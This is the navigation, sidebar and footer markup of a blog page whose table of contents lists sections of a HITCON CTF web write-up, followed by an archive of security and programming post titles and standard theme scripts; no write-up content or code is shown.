+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#One-Line-PHP-Challenge"><span class="toc-number">1.1.</span> <span class="toc-text">One Line PHP Challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#include-策略"><span class="toc-number">1.1.1.</span> <span class="toc-text">include 策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#session-策略"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">session 策略</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cleanup-策略"><span class="toc-number">1.1.2.</span> <span class="toc-text">cleanup 策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Prefix（-lt-php）解决"><span class="toc-number">1.1.3.</span> <span class="toc-text">Prefix（@&lt;?php）解决</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#方法一-orange"><span class="toc-number">1.1.4.</span> <span class="toc-text">方法一@orange:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#附-orange-tw-w-bc-pl"><span class="toc-number">1.1.5.</span> <span class="toc-text">附: orange.tw/w/bc.pl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-cake"><span class="toc-number">1.2.</span> <span class="toc-text">baby cake</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#查看composer-json"><span class="toc-number">1.2.1.</span> <span class="toc-text">查看composer.json</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞寻找"><span class="toc-number">1.2.2.</span> <span class="toc-text">漏洞寻找</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#针对header的序列化以及反序列化"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">针对header的序列化以及反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#body"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">body</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rce"><span class="toc-number">1.2.3.</span> <span class="toc-text">rce</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#On-my-Raddit-V2"><span class="toc-number">1.3.</span> <span class="toc-text">On my Raddit V2</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 57
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href="/posts/49989/">hitcon-复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/30021/">hack-lu</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/15111/">护网杯pwn-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href="/posts/56316/">netty入门到精通-初识NIO</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/posts/61088/">php-项目结构</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/posts/11284/">jvm-java虚拟机如何运行java字节码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng9</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href="/posts/1345/">pwnable.kr_刷刷刷</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/62824/">dubbo项目结构</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/28842/">zookeeper安装-启动</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/11234/">dubbo-启动</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href="/posts/32469/">noxctf-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/posts/18428/">lamp && lnmp以apt-get的方式安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span><a class="archive-post-title" href="/posts/7418/">websec.fr-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/posts/42614/">TokyoWesterns CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">awd准备工作</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href="/posts/39475/">ctfzone-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/13474/">real-world-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/6549/">ISITDTU-CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href="/posts/46785/">巅峰极客ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/posts/5109/">php-命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/62555/">RSA学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/28940/">ssti</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span><a class="archive-post-title" href="/posts/45992/">php命令执行函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/09</span><a class="archive-post-title" href="/posts/63527/">ollyice</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/16486/">web安全备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/29914/">ssrf+gopher</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">proc的作用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/21</span><a class="archive-post-title" href="/posts/32268/">sctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href="/posts/54865/">python多线程和lock和Rlock</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/54897/">linux格式化字符串漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/50844/">linux命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/51203/">LRE_PAYLOAD绕过open_basedir</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/17498/">mysql忘记密码/修改密码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href="/posts/26365/">suctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/08</span><a class="archive-post-title" href="/posts/62655/">cbc翻转</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href="/posts/60875/">misc思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/33488/">简单的命令（shell+python）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/15636/">parse_url + curl</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href="/posts/22230/">ddctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/posts/65402/">PHP代码审计归纳</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/52452/">xss</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/24854/">url相对路径和绝对路径</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href="/posts/40688/">python3和python2 base64的问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span><a class="archive-post-title" href="/posts/41083/">sql注入大全</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+    
+        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
+    
+        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="安全"><span class="iconfont-archer">&#xe60a;</span>安全</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Tianji"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
